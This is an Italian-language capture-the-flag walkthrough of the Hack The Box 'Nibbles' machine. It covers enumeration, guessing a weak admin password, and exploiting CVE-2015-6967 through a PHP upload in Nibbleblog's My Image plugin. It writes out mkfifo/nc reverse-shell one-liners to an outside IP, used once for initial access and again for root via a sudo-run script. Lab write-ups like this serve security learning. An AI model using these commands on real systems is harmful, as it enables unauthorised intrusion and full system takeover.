# NIBBLES

Associamo il nome host all'ip

![echo "10.129.96.84 nibbles.htb" | sudo tee -a /etc/hosts](./immagini/1-host.png)

Con una scansione con nmap troviamo 2 porte aperte, 22 e 80

![nmap -sV nibbles.htb -oN scan.nmap](./immagini/2-scan.png)

Nel codice html della pagina web troviamo nei commenti una directory, navigandoci troviamo una pagina ma non c'è nulla di interessante

![http://nibbles.htb/](./immagini/3-dir-web.png)

Proviamo un'enumerazione e troviamo diverse directory e file

![gobuster dir -u http://nibbles.htb/nibbleblog/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt](./immagini/4-dir-enum.png)

Dentro il file content/private/users.xml vediamo che esiste l'utente admin ma non c'è scritta la password

![http://nibbles.htb/nibbleblog/content/private/users.xml](./immagini/5-admin-user.png)

Nel file README troviamo la versione 4.0.3 di Nibbleblog. Questa versione è vulnerabile alla CVE-2015-6967, la quale permette, grazie al plugin My Image, ad un admin, di eseguire comandi arbitrari sulla macchina caricando un file con estensione eseguibile, nel nostro caso php visto che il sito è scritto in questo linguaggio

![http://nibbles.htb/nibbleblog/README](./immagini/4-nibbleblog-version.png)

nella pagina /nibbleblog/admin.php possiamo provare a loggarci con utente admin, usando le password più comuni, come ad esempio admin, password e nibbles. Vediamo che quest'ultima è quella corretta e possiamo loggarci con l'utente admin

![http://nibbles.htb/nibbleblog/admin.php](./immagini/6-admin-cred.png)
![](./immagini/6-admin-dashboard.png)

Una volta loggati vediamo che dentro 'Plugins' possiamo caricare un file, proprio con My Image, creaiamo un file in php con una reverse shell e carichiamolo

![echo "<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.81 7000 >/tmp/f'); ?>" > image.php](./immagini/7-rev-shell.png)
![http://nibbles.htb/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image](./immagini/7-upload-image.png)

Cercando tra le directory troviamo il nostro file php dentro /content/private/plugins/my_image/ avviamo il listener e apriamo il file per ottenere la reverse shell

![nc -lvnp 7000](./immagini/8-shell.png)

Una volta ottenuta la shell siamo dentro come utente nibbler e possiamo ottenere la prima flag

![](./immagini/9-user-flag.png)

Cerchiamo quali comandi possiamo lanciare con sudo e vediamo il file monitor.sh che è dentro un file .zip nella nostra home, estraiamolo

![](./immagini/10-privileges.png)

Ora scriviamo una reverse shell dentro il file, come abbiamo fatto prima, ed eseguiamo monitor.sh con sudo

![echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.81 8000 >/tmp/f' | tee -a monitor.sh](./immagini/11-root-shell.png)

Aprendo un listener abbiamo una shell come root e possiamo ottenere l'ultima flag

![nc -lvnp 8000](./immagini/12-root-flag.png)